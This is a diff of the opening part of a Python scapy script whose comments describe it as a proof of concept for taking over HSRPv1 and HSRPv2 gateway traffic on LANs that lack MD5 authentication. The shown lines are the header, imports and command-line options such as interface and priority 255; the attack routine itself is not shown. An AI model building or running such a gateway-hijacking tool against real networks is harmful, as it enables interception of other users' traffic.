@@ -1,12 +1,14 @@
 #!/usr/bin/env python
 
-# $Id: 20130306$
-# $Date: 2013-03-06 10:27:10$
 # $Author: Marek Lukaszuk$
 
 # This takes over any HSRPv1 and v2
 # communication in LAN that
 # is _not_ protected by MD5 auth
+
+# OK, if I knew that this would land on reddit I would make the code nicer.
+# this is just a PoC, mostly for HSRPv2, because most of the tools support
+# only HSRPv1
 
 # http://www.networksorcery.com/enp/protocol/hsrp.htm
 # http://www.cisco.com/en/US/docs/ios/12_3t/12_3t2/feature/guide/gthsrpau.html
@@ -14,13 +16,12 @@
 from scapy.all import *
 import time
 import sys
-import hashlib
 import argparse
 
 parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
 parser.add_argument('-s','--source',help='source IP address, either IPv4 or IPv6, if not set uses the corresponding interface address')
 parser.add_argument('-i','--iface',default="tap0",help='interface to listen on and send packets (default tap0)')
-parser.add_argument('-a','--auth',default="cisco",help='authentication data in the packet (default: cisco)') #TODO
+#parser.add_argument('-a','--auth',default="cisco",help='authentication data in the packet (default: cisco)') #TODO
 parser.add_argument('-p','--priority',default=255,help='priority (default 255)', type=int)
 parser.add_argument('-t','--hellotime',default=1,help='hello time (default 1s)', type=int)
 parser.add_argument('-v','--verbose',action="store_true",help='enables scapy verbose output')
